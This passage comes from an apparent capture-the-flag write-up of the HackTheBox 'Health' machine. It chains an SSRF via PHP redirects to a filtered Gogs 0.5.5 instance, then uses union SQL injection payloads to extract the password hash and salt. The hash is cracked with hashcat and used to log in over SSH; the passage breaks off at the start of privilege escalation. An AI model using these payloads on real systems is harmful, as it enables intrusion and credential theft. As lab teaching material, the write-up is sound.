  <span class="s2">"body"</span>: <span class="s2">"&lt;!DOCTYPE html&gt;</span><span class="se">\n</span><span class="s2">&lt;html lang=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n</span><span class="s2">    &lt;meta charset=</span><span class="se">\"</span><span class="s2">UTF-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">    &lt;meta name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"</span><span class="s2"> content=</span><span class="se">\"</span><span class="s2">width=device-width, initial-scale=1.0</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">    &lt;meta http-equiv=</span><span class="se">\"</span><span class="s2">X-UA-Compatible</span><span class="se">\"</span><span class="s2"> content=</span><span class="se">\"</span><span class="s2">ie=edge</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">    &lt;title&gt;HTTP Monitoring Tool&lt;</span><span class="se">\/</span><span class="s2">title&gt;</span><span class="se">\n</span><span class="s2">    &lt;link href=</span><span class="se">\"</span><span class="s2">http:</span><span class="se">\/\/</span><span class="s2">localhost</span><span class="se">\/</span><span class="s2">css</span><span class="se">\/</span><span class="s2">app.css</span><span class="se">\"</span><span class="s2"> rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"</span><span class="s2"> type=</span><span class="se">\"</span><span class="s2">text</span><span class="se">\/</span><span class="s2">css</span><span class="se">\"\/</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;</span><span class="se">\/</span><span class="s2">head&gt;</span><span class="se">\n</span><span class="s2">&lt;body&gt;</span><span class="se">\n</span><span class="s2">&lt;div class=</span><span class="se">\"</span><span class="s2">container</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">        &lt;div class=</span><span class="se">\"</span><span class="s2">container</span><span class="se">\"</span><span class="s2"> style=</span><span class="se">\"</span><span class="s2">padding: 150px</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\n\t</span><span class="s2">&lt;h1 class=</span><span class="se">\"</span><span class="s2">text-center</span><span class="se">\"</span><span class="s2">&gt;health.htb&lt;</span><span class="se">\/</span><span class="s2">h1&gt;</span><span class="se">\n\t</span><span class="s2">&lt;h4 class=</span><span class="se">\"</span><span class="s2">text-center</span><span class="se">\"</span><span class="s2">&gt;Simple health checks for any URL&lt;</span><span class="se">\/</span><span class="s2">h4&gt;</span><span class="se">\n\n\t</span><span class="s2">&lt;hr&gt;</span><span class="se">\n\n\n\n\n\t</span><span class="s2">&lt;p&gt;This is a free utility that allows you to remotely check whether an http service is available. It is useful if you want to check whether the server is correctly running or if there are any firewall issues blocking access.&lt;</span><span class="se">\/</span><span class="s2">p&gt;</span><span class="se">\n\n\t</span><span class="s2">&lt;div class=</span><span class="se">\"</span><span class="s2">card-header</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">    Configure Webhook ..."</span>
<span class="o">}</span>

</pre></td></tr></tbody></table></code></div></div>

<p>I was able to use it to query the server. But I already had access to the site on port 80. So that did not help much. I was going to write a script to try all ports on the server. But I remembered that RustScan did not show filtered ports. I scanned the server again, but with Nmap.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nmap target                  
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-01-04 08:42 EST
Nmap scan report <span class="k">for </span>target <span class="o">(</span>10.10.11.176<span class="o">)</span>
Host is up <span class="o">(</span>0.025s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1.55 seconds
</pre></td></tr></tbody></table></code></div></div>

<p>Port 3000 was filtered. But I might be able to access it through the SSRF. I changed my redirection.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: http://localhost:3000/"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>And sent my payload again. This time I got the content of a different site in the webhook payload.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"webhookUrl"</span><span class="p">:</span><span class="s2">"http:</span><span class="se">\/\/</span><span class="s2">10.10.14.6:8000</span><span class="se">\/</span><span class="s2">payload"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"monitoredUrl"</span><span class="p">:</span><span class="s2">"http:</span><span class="se">\/\/</span><span class="s2">10.10.14.6</span><span class="se">\/</span><span class="s2">redirect.php"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"health"</span><span class="p">:</span><span class="s2">"up"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"body"</span><span class="p">:</span><span class="s2">"&lt;!DOCTYPE html&gt;</span><span class="se">\n</span><span class="s2">&lt;html&gt;</span><span class="se">\n\t</span><span class="s2">&lt;head data-suburl=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n\t\t</span><span class="s2">
  ...
  &lt;meta name=</span><span class="se">\"</span><span class="s2">author</span><span class="se">\"</span><span class="s2"> content=</span><span class="se">\"</span><span class="s2">Gogs - Go Git Service</span><span class="se">\"</span><span class="s2"> </span><span class="se">\/</span><span class="s2">&gt;</span><span class="se">\n\t\t</span><span class="s2">
  &lt;meta name=</span><span class="se">\"</span><span class="s2">description</span><span class="se">\"</span><span class="s2"> content=</span><span class="se">\"</span><span class="s2">Gogs(Go Git Service) a painless self-hosted Git Service written in Go</span><span class="se">\"</span><span class="s2"> </span><span class="se">\/</span><span class="s2">&gt;</span><span class="se">\n\t\t</span><span class="s2">
  &lt;meta name=</span><span class="se">\"</span><span class="s2">keywords</span><span class="se">\"</span><span class="s2"> content=</span><span class="se">\"</span><span class="s2">go, git, self-hosted, gogs</span><span class="se">\"</span><span class="s2">&gt;
  ...
  </span><span class="se">\u</span><span class="s2">00a9 2014 GoGits </span><span class="se">\u</span><span class="s2">00b7 Version: 0.5.5.1010 Beta 
  ...
  "</span><span class="p">,</span><span class="w">
  </span><span class="nl">"message"</span><span class="p">:</span><span class="s2">"HTTP</span><span class="se">\/</span><span class="s2">1.0 302 Found"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"headers"</span><span class="p">:{</span><span class="nl">"Host"</span><span class="p">:</span><span class="s2">"10.10.14.6"</span><span class="p">,</span><span class="nl">"Date"</span><span class="p">:</span><span class="s2">"Thu, 05 Jan 2023 12:32:06 GMT"</span><span class="p">,</span><span class="nl">"Connection"</span><span class="p">:</span><span class="s2">"close"</span><span class="p">,</span><span class="nl">"X-Powered-By"</span><span class="p">:</span><span class="s2">"PHP</span><span class="se">\/</span><span class="s2">8.1.12"</span><span class="p">,</span><span class="nl">"Location"</span><span class="p">:</span><span class="s2">"http:</span><span class="se">\/\/</span><span class="s2">localhost:3000</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="nl">"Content-type"</span><span class="p">:</span><span class="s2">"text</span><span class="se">\/</span><span class="s2">html; charset=UTF-8"</span><span class="p">,</span><span class="nl">"Content-Type"</span><span class="p">:</span><span class="s2">"text</span><span class="se">\/</span><span class="s2">html; charset=UTF-8"</span><span class="p">,</span><span class="nl">"Set-Cookie"</span><span class="p">:</span><span class="s2">"_csrf=; Path=</span><span class="se">\/</span><span class="s2">; Max-Age=0"</span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I removed the content, but we can see that the server had a very old beta version (0.5.5.1010 Beta) of <a href="https://gogs.io/">Gogs</a>.</p>

<h2 id="sql-injection"><span class="mr-2">SQL Injection</span><a href="#sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I searched for known vulnerabilities in this version of Gogs and found that it was vulnerable to <a href="https://www.exploit-db.com/exploits/35238">SQL Injection</a>. ExploitDB had two proofs of concept (POC). The user search was simpler, so I tried this one first.</p>

<p>I started by trying the user search feature.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Location: http://localhost:3000/api/v1/users/search?q=a'</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It gave me a user back.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"webhookUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://10.10.14.6:8000/payload"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"monitoredUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://10.10.14.6/redirect.php"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"health"</span><span class="p">:</span><span class="w"> </span><span class="s2">"up"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"body"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">data</span><span class="se">\"</span><span class="s2">:[{</span><span class="se">\"</span><span class="s2">username</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">susanne</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">avatar</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce</span><span class="se">\"</span><span class="s2">}],</span><span class="se">\"</span><span class="s2">ok</span><span class="se">\"</span><span class="s2">:true}"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"HTTP/1.0 302 Found"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"headers"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"Host"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.10.14.6"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Date"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Thu, 05 Jan 2023 12:51:23 GMT"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Connection"</span><span class="p">:</span><span class="w"> </span><span class="s2">"close"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"X-Powered-By"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PHP/8.1.12"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Location"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:3000/api/v1/users/search?q=a"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Content-type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"text/html; charset=UTF-8"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Content-Type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/json; charset=UTF-8"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Set-Cookie"</span><span class="p">:</span><span class="w"> </span><span class="s2">"_csrf=; Path=/; Max-Age=0"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Content-Length"</span><span class="p">:</span><span class="w"> </span><span class="s2">"111"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I took note of the username and tried injecting some SQL. The code was removing spaces, so I had to use <code class="language-plaintext highlighter-rouge">/**/</code> instead.</p>

<p>Next, I tried the payload from the POC, but it failed. So I had to start experimenting to build my own injection.</p>

<p>I used <code class="language-plaintext highlighter-rouge">Order By</code> to figure out how many fields needed to be returned by the query.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">header</span><span class="p">(</span><span class="s2">"Location: http://localhost:3000/api/v1/users/search?q=')/**/Order/**/By/**/27/**/--/**/-"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>27 fields worked.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"body"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">data</span><span class="se">\"</span><span class="s2">:[{</span><span class="se">\"</span><span class="s2">username</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">susanne</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">avatar</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce</span><span class="se">\"</span><span class="s2">}],</span><span class="se">\"</span><span class="s2">ok</span><span class="se">\"</span><span class="s2">:true}"</span><span class="p">}</span><span class="w">

</span></pre></td></tr></tbody></table></code></div></div>

<p>But 28 failed.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">header</span><span class="p">(</span><span class="s2">"Location: http://localhost:3000/api/v1/users/search?q=')/**/Order/**/By/**/28/**/--/**/-"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"webhookUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://10.10.14.7:8000/payload"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"monitoredUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://10.10.14.7/redirect.php"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"health"</span><span class="p">:</span><span class="w"> </span><span class="s2">"down"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I knew I needed to return 27 fields in my union query. I had to find out which of those fields were returned in the JSON.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">header</span><span class="p">(</span><span class="s2">"Location: http://localhost:3000/api/v1/users/search?q='/**/AND/**/1=2)/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/FROM/**/user/**/where/**/('%25'%3D'"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I could use the 3rd and 15th fields to extract data.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"3"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"avatar"</span><span class="p">:</span><span class="w"> </span><span class="s2">"//1.gravatar.com/avatar/15"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"ok"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I cloned the <a href="https://github.com/gogs/gogs">Gogs‚Äô git repository</a> and checked out the <code class="language-plaintext highlighter-rouge">v0.5.5</code> tag. I looked at the code and saw that I needed to extract the <code class="language-plaintext highlighter-rouge">passwd</code> and <code class="language-plaintext highlighter-rouge">salt</code> fields from the <a href="https://github.com/gogs/gogs/blob/v0.5.5/models/user.go#L53">user table</a>.</p>

<p>I extracted the hashed password.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">header</span><span class="p">(</span><span class="s2">"Location: http://localhost:3000/api/v1/users/search?q='/**/AND/**/1=2)/**/UNION/**/ALL/**/SELECT/**/1,2,passwd,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/FROM/**/user/**/where/**/('%25'%3D'"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"avatar"</span><span class="p">:</span><span class="w"> </span><span class="s2">"//1.gravatar.com/avatar/15"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"ok"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>And the salt.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">header</span><span class="p">(</span><span class="s2">"Location: http://localhost:3000/api/v1/users/search?q='/**/AND/**/1=2)/**/UNION/**/ALL/**/SELECT/**/1,2,salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/FROM/**/user/**/where/**/('%25'%3D'"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sO3XIbeW14"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"avatar"</span><span class="p">:</span><span class="w"> </span><span class="s2">"//1.gravatar.com/avatar/15"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"ok"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I needed to crack the hash, but I did not know the format I should use for hashcat. I found an <a href="https://github.com/hashcat/hashcat/issues/1583">issue</a> that explained how to convert the hash to the format hashcat expected.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'sO3XIbeW14'</span> | <span class="nb">base64          
</span><span class="nv">c08zWEliZVcxNA</span><span class="o">==</span>

<span class="nv">$ </span>perl <span class="nt">-e</span> <span class="s1">'print pack ("H*", "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37")'</span> | <span class="nb">base64 
</span>ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc<span class="o">=</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I saved those values to a file and launched hashcat.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>hash.txt    
sha256:10000:c08zWEliZVcxNA<span class="o">==</span>:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc<span class="o">=</span>


<span class="nv">$ </span>hashcat <span class="nt">-a0</span> hash.txt /usr/share/seclists/rockyou.txt
hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting <span class="k">in </span>autodetect mode
                                                           
OpenCL API <span class="o">(</span>OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#1 [The pocl project]</span>
<span class="o">============================================================================================================================================</span>
<span class="k">*</span> Device <span class="c">#1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2869/5803 MB (1024 MB allocatable), 6MCU</span>

Hash-mode was not specified with <span class="nt">-m</span><span class="nb">.</span> Attempting to auto-detect <span class="nb">hash </span>mode.
The following mode was auto-detected as the only one matching your input <span class="nb">hash</span>:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the <span class="nb">hash </span>type.

Host memory required <span class="k">for </span>this attack: 1 MB

Dictionary cache hit:
<span class="k">*</span> Filename..: /usr/share/seclists/rockyou.txt
<span class="k">*</span> Passwords.: 14344384
<span class="k">*</span> Bytes.....: 139921497
<span class="k">*</span> Keyspace..: 14344384

sha256:10000:c08zWEliZVcxNA<span class="o">==</span>:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc<span class="o">=</span>:REDACTED
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 <span class="o">(</span>PBKDF2-HMAC-SHA256<span class="o">)</span>
Hash.Target......: sha256:10000:c08zWEliZVcxNA<span class="o">==</span>:ZsB0ZFVFeB8QZPt/0Rd0U...9O/jc<span class="o">=</span>
Time.Started.....: Tue Jan  3 06:39:54 2023 <span class="o">(</span>27 secs<span class="o">)</span>
Time.Estimated...: Tue Jan  3 06:40:21 2023 <span class="o">(</span>0 secs<span class="o">)</span>
Kernel.Feature...: Pure Kernel
Guess.Base.......: File <span class="o">(</span>/usr/share/seclists/rockyou.txt<span class="o">)</span>
Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
Speed.#1.........:     2640 H/s <span class="o">(</span>7.80ms<span class="o">)</span> @ Accel:256 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
Progress.........: 72192/14344384 <span class="o">(</span>0.50%<span class="o">)</span>
Rejected.........: 0/72192 <span class="o">(</span>0.00%<span class="o">)</span>
Restore.Point....: 70656/14344384 <span class="o">(</span>0.49%<span class="o">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9984-9999
Candidate.Engine.: Device Generator
Candidates.#1....: jonquil -&gt; 011392
Hardware.Mon.#1..: Util: 96%

Started: Tue Jan  3 06:39:52 2023
Stopped: Tue Jan  3 06:40:23 2023
</pre></td></tr></tbody></table></code></div></div>

<p>I tried ssh with the cracked password.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ssh susanne@target
susanne@target<span class="s1">'s password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jan  3 11:42:34 UTC 2023

  System load:  0.01              Processes:           173
  Usage of /:   66.4% of 3.84GB   Users logged in:     0
  Memory usage: 11%               IP address for eth0: 10.10.11.176
  Swap usage:   0%


0 updates can be applied immediately.

susanne@health:~$ ls
user.txt

susanne@health:~$ cat user.txt 
REDACTED
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="getting-root"><span class="mr-2">Getting Root</span><a href="#getting-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Once connected to the server, I started looking for ways to elevate my privileges. I could not run anything as <code class="language-plaintext highlighter-rouge">sudo</code> and I did not find any suspicious <code class="language-plaintext highlighter-rouge">suid</code> binaries.</p>

<p>I looked at the websites for credentials in configuration files. The Gogs code was not readable by my user. But the Laravel app on port 80 was.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
